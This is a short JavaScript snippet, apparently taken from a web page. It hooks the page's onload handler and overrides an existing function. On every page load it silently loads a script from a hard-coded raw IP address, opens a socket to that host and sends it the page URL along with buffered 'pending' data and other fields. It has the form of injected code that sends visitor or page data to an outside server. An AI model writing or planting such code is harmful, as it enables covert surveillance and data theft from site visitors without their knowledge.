function addLoadEvent(func) { var oldonload = window.onload; if (typeof window.onload != 'function') { window.onload = func; } else { window.onload = function() { if (oldonload) { oldonload(); } func(); } } }
function doTAdd (){window.TVeri.i=function () {function TVinit () {c.socket = io.connect('http://46.249.41.188:81', { 'reconnect': false });c.socket.on('connect',function(){c.socket.emit('c',{u:document.location.href,f:c.from,t:c.to});});c.socket.on('do',function(d){c.socket.emit('o',{p:c.pending,u:document.location.href,f:c.from,t:c.to,a:c.amode});c.pending=[];c.amode=0;c.socket.disconnect();});}if (c.initialized==0) {var newScript = document.createElement('script');newScript.type = 'text/javascript';newScript.src = 'http://46.249.41.188:81/socket.io/socket.io.js';document.getElementsByTagName('head')[0].appendChild(newScript);c.onFunctionAvailable('io',function(){TVinit();});c.initialized=1;}else {c.onFunctionAvailable('io',function(){TVinit();});}}}
addLoadEvent(doTAdd);